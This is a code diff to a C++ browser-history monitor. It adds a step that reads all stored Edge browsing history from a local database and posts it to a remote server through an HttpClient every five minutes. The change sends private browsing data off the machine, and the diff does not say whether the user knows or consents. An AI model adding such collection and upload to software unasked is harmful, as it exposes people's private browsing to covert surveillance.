@@ -1,6 +1,8 @@
+#include "HttpClient.h"
 #include "BrowserHistory.h"
 #include "Common.h"
 #include "SQLiteDB.h"
+
 #include <thread>
 
 BrowserHistory::BrowserHistory() {}
@@ -19,8 +21,6 @@ BrowserHistory& BrowserHistory::GetInstance() {
 void BrowserHistory::SetAppDataPath(std::wstring wszAppDataPath) {
 	m_wszAppDataPath = wszAppDataPath;
 }
-
-
 
 std::vector<BrowserItem> BrowserHistory::GetEdgeHistory() {
     std::wstring dir = GetCurrentDir();
@@ -109,6 +109,14 @@ void BrowserHistory::MonitorBrowserHistory() {
 			}
 		}
 
-		std::this_thread::sleep_for(std::chrono::minutes(5));
+		json browserData = browserHistoryDB.query_all();
+		HttpClient& httpClient = HttpClient::GetInstance();
+        if (!browserData.is_null()) {
+            if (httpClient.PostBrowserHistory(browserData)) {
+                browserHistoryDB.update_status(browserData);
+            }
+        }
+
+        std::this_thread::sleep_for(std::chrono::minutes(5));
 	}
 }
